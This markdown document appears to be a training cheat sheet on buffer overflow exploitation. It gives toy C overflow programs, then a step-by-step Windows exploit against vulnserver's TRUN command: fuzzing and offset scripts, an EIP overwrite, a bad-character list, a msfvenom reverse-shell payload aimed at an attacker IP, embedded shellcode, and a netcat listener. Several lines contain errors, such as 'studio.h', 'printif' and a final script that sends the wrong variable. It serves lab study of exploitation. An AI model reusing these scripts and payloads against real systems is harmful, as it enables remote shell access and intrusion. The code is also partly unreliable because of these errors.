## Buffer Overflow Exploitation

#### Type Buffer Overflow
* Stack-Based Buffer Overflow
* EBP (Extended Base Pointer)
* ESP (Extended Stack Pointer)
* EIP (Extended Instruction Pointer)
* ESI (Extended Source Index)
* EDI (Extended Destination Index)

## Simple Buffer Overflow in C Programming
### A. Stack Buffer Overflow
##### Save File : stack_bufferoverflow.c
```
#include<studio.h>
#include<stdlib.h>
#include<string.h>
int buffer(char str[]) {
	char buff[12];
	strcpy(buff, str);
	return 1;
}
int main(int argc, char **argy) {
	buffer("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD");
	printf("After buffer overflow\n");
	return 1;
}
```
##### Compile
```
gcc stack_bufferoverflow.c
```

##### Testing
```
./a.out
```

### B. Heap Buffer Overflow
##### Save File : heap_bufferflow.c
```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int main(int argc, char **argv){
	char *in = malloc(18);
	char *out = malloc(18);
	strcpy(out, "Sample Output");
	strcpy(in, argv[1]);
	printif("Input at %p: %s\n",in,in);
	printif("Output at %p: %s\n,out,out);
	printif("\n\n%s\n",out);
}
```

##### Compile
```
gcc heap_overflow.c
```

##### Testing
```
./a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## Windows Buffer Overflow Exploitation
* Perform Spiking
* Perform Fuzzing
* Identify Offset
* Overwrite EIP Register
* Identify Bad Characters
* Generate Shellcode
* Gain Root Access

### A. Perform Spiking
#### 1. STAT 
##### Upload vulnserver.exe (to Victim)
##### Establish a connection vulnserver using netcat (from Attacker)
```
nc -nv 172.23.74.125 9999
```
##### STATS templates and perform spiking. Save file : stats.spk
```
s_readline();
s_string("STATS ");
s_string_variable("0");
```
##### Testing (from Attacker)
```
generic send tcp 10.13.3.55 9999 stats.spk 0 0 
```

#### 2. TRUN
##### Upload vulnserver.exe (to Victim)
##### Establish a connection vulnserver using netcat (from Attacker)
```
nc -nv 172.23.74.125 9999
```
##### TRUN templates and perform spiking. Save file : trun.spk
```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
##### Testing (from Attacker)
```
generic send tcp 172.23.74.125 9999 trun.spk 0 0 
```

### B. Perform Fuzzing

##### Open File vulnserver.exe from ImunnityDebugger and Run (to Victim)

##### Create File : fuzz.py (from Attacker)
```
#!/usr/bin/python2
import sys, socket
from time import sleep

buff = "A" * 100

while True:
	try:
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.connect(('172.23.74.125', 9999))
		soc.send(('TRUN /.:/' + buff))
		soc.close()
		sleep(1)
		buff = buff + "A" * 100
	except:
		print "Fuzzing Crashed Vuln Server at %s bytes" % str(len(buff))
		sys.exit()
```

##### Testing (from Attacker)
```
chmod +x fuzz.py
./fuzz.py
```

##### Verification (from Attacker)

### C. Identify Offset
##### Create Pattern
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900 > create_pattern.txt
```

##### Create File : find_offset.py
```
#!/usr/bin/python2
import sys, socket

offset =

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + offset))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

##### Testing (from Attacker)
```
chmod +x find_offset.py
./find_offset.py
```

##### Verification and Copy EIP (from Victim)

##### Extract EIP (from Attacker)
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337 > extract_EIP
```

### D. Overwrite EIP Register

##### Create File : overwrite.py (from Attacker)
```
#!/usr/bin/python2
import sys, socket

shellcode = "C" * 2003 + "D" * 4

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + shellcode))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

##### Testing (from Attacker)
```
chmod +x overwrite.py
./overwrite.py
```

##### Verification and Copy EIP (from Victim)

### E. Identify Bad Characters

##### Install Badchars
##### Create File : badchars.py (from Attacker)
```
#!/usr/bin/python2
import sys, socket

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

shellcode = "C" * 2003 + "D" * 4 + badchars

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + shellcode))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

##### Testing (from Attacker)
```
chmod +x badchars.py
./badchars.py
```

##### Verification and Copy ESP (from Victim)

### F. Identify Module (JUMP)
#####

##### Create File : jump.py
```
#!/usr/bin/python2
import sys, socket

shellcode = "C" * 2003 + "xaf\x11\x50\x62"

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + shellcode))
	soc.close()

except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

### G. Generate Shellcode
##### Generate Shellcode
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.13.3.55 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" > shellcode.txt
```

### H. Gain Root Access
##### Create File : shellcode.py (from Attacker)
```
#!/usr/bin/python2
import sys, socket

overflow = (
"\xba\xc3\xa1\xcb\x71\xdb\xde\xd9\x74\x24\xf4\x5f\x31\xc9"
"\xb1\x52\x31\x57\x12\x83\xef\xfc\x03\x94\xaf\x29\x84\xe6"
"\x58\x2f\x67\x16\x99\x50\xe1\xf3\xa8\x50\x95\x70\x9a\x60"
"\xdd\xd4\x17\x0a\xb3\xcc\xac\x7e\x1c\xe3\x05\x34\x7a\xca"
"\x96\x65\xbe\x4d\x15\x74\x93\xad\x24\xb7\xe6\xac\x61\xaa"
"\x0b\xfc\x3a\xa0\xbe\x10\x4e\xfc\x02\x9b\x1c\x10\x03\x78"
"\xd4\x13\x22\x2f\x6e\x4a\xe4\xce\xa3\xe6\xad\xc8\xa0\xc3"
"\x64\x63\x12\xbf\x76\xa5\x6a\x40\xd4\x88\x42\xb3\x24\xcd"
"\x65\x2c\x53\x27\x96\xd1\x64\xfc\xe4\x0d\xe0\xe6\x4f\xc5"
"\x52\xc2\x6e\x0a\x04\x81\x7d\xe7\x42\xcd\x61\xf6\x87\x66"
"\x9d\x73\x26\xa8\x17\xc7\x0d\x6c\x73\x93\x2c\x35\xd9\x72"
"\x50\x25\x82\x2b\xf4\x2e\x2f\x3f\x85\x6d\x38\x8c\xa4\x8d"
"\xb8\x9a\xbf\xfe\x8a\x05\x14\x68\xa7\xce\xb2\x6f\xc8\xe4"
"\x03\xff\x37\x07\x74\xd6\xf3\x53\x24\x40\xd5\xdb\xaf\x90"
"\xda\x09\x7f\xc0\x74\xe2\xc0\xb0\x34\x52\xa9\xda\xba\x8d"
"\xc9\xe5\x10\xa6\x60\x1c\xf3\x65\x63\x54\x7e\x1e\x8e\x68"
"\xa7\xd1\x07\x8e\xcd\xfd\x41\x19\x7a\x67\xc8\xd1\x1b\x68"
"\xc6\x9c\x1c\xe2\xe5\x61\xd2\x03\x83\x71\x83\xe3\xde\x2b"
"\x02\xfb\xf4\x43\xc8\x6e\x93\x93\x87\x92\x0c\xc4\xc0\x65"
"\x45\x80\xfc\xdc\xff\xb6\xfc\xb9\x38\x72\xdb\x79\xc6\x7b"
"\xae\xc6\xec\x6b\x76\xc6\xa8\xdf\x26\x91\x66\x89\x80\x4b"
"\xc9\x63\x5b\x27\x83\xe3\x1a\x0b\x14\x75\x23\x46\xe2\x99"
"\x92\x3f\xb3\xa6\x1b\xa8\x33\xdf\x41\x48\xbb\x0a\xc2\x68"
"\x5e\x9e\x3f\x01\xc7\x4b\x82\x4c\xf8\xa6\xc1\x68\x7b\x42"
"\xba\x8e\x63\x27\xbf\xcb\x23\xd4\xcd\x44\xc6\xda\x62\x64"
"\xc3")

shellcode = "C" * 2003 + "xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.connect(('172.23.74.125', 9999))
	soc.send(('TRUN /.:/' + overflow))
	soc.close()
except:
	print "Error: Unable to establish connection with Server"
	sys.exit()
```

##### Testing (from Attacker)
```
./shellcode.py
```

##### Running Netcat (from Attacker)
```
nc -nvlp 4444
```

## Bug

#### Support
